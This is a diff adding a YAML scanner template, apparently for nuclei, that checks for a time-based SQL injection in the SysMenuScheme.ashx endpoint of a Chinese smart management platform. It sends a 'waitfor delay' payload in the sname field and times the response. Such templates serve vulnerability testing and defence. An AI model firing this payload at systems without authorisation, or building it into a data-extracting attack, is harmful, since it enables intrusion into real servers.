@@ -1,0 +1,50 @@
+id: poc-yaml-windor-icmp-sysmenuscheme-ashx-sqli
+info:
+  name: 银达汇智智慧综合管理平台 SysMenuScheme.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - id: check-landing-page
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "智慧综合管理平台登入"
+      - type: status
+        status:
+          - 200
+
+  - id: sqli-check
+    method: POST
+    path:
+      - "{{BaseURL}}/Module/Kernel/Controller/SysMenuScheme.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "action=exportExcel&sname='waitfor+delay'0:0:{{t1}}'--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "SessionId"
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
